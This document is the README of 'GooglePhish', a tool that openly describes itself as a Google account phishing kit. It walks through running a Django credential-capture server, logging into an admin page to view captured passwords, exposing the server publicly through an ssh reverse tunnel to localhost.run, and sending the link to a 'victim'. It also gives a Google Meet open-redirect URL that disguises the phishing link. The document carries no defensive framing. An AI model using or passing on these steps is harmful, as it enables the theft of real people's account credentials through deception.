# GooglePhish
- Google Account Phishing Tool

## Generate and update new random key before using GooglePhish
-  Generate and copy new key
    ```bash
    python3 generate_new_key.py
    ```
- update secret key in settings.py of GooglePhish on line 23
  ```python
    # SECURITY WARNING: keep the secret key used in production secret!
    SECRET_KEY = 'your_new_key'
  ```
  
## Admin Page
- login page 
    ```url
    http://127.0.0.1:8000/admin
    ``` 
    > `Note` : It is recommended to change default admin page url.  
    > 
    > ***Default Login Details***  
    > `username` :  admin  
    > `password` : googlephish  


## Create new admin user to view passwords

- Create user
    ```bash
    python3 manage.py createsuperuser
    ```
- migrate db
    ```bash
    python3 manage.py makemigrations
    python3 manage.py migrate
    ```
- run server
    ```bash
    python3 manage.py runserver
    ```

## Start Server
```bash
python3 manage.py runserver
```
> if static files are not loading, turn on debug mode or use 
> ```bash
> python3 manage.py runserver --insecure
> ```

## For phishing over the internet

- Start server
    ```bash
    python3 manage.py --insecure
    ```

- forward port using ssh
    ```bash
    ssh -R 80:localhost:8000 localhost.run
    ```
    > 8000 is port of localhost server.
    > 80 is [localhost.run](https://localhost.run/) server port. Localhost is service that helps you to expose your server running on localhost to the internet, visit their [documentation](https://localhost.run/docs/) for more info


- Now send link to your victim

> You can redirect user from google meet to your phishing page link using 
> ```
> https://meet.google.com/linkredirect?dest=your_link
> ```


### Have any Ideas 💡 or issue
- Create an issue
- Fork the repo, update script and create a Pull Request
       
       
 ### Connect with me on:
  
  <p align ="left">
    <a href = "https://github.com/dmdhrumilmistry" target="_blank"><img src = "https://img.shields.io/badge/Github-dmdhrumilmistry-333"></a>
    <a href = "https://www.instagram.com/dmdhrumilmistry/" target="_blank"><img src = "https://img.shields.io/badge/Instagram-dmdhrumilmistry-833ab4"></a>
    <a href = "https://twitter.com/dmdhrumilmistry" target="_blank"><img src = "https://img.shields.io/badge/Twitter-dmdhrumilmistry-4078c0"></a><br>
    <a href = "https://www.youtube.com/channel/UChbjrRvbzgY3BIomUI55XDQ" target="_blank"><img src = "https://img.shields.io/badge/YouTube-Dhrumil%20Mistry-critical"></a>
    <a href = "https://dhrumilmistrywrites.blogspot.com/ " target="_blank"><img src = "https://img.shields.io/badge/Blog-Dhrumil%20Mistry-bd2c00"></a>
    <a href = "https://www.linkedin.com/in/dhrumil-mistry-312966192/" target="_blank"><img src = "https://img.shields.io/badge/LinkedIn-Dhrumil%20Mistry-4078c0"></a><br>
   </p>
  
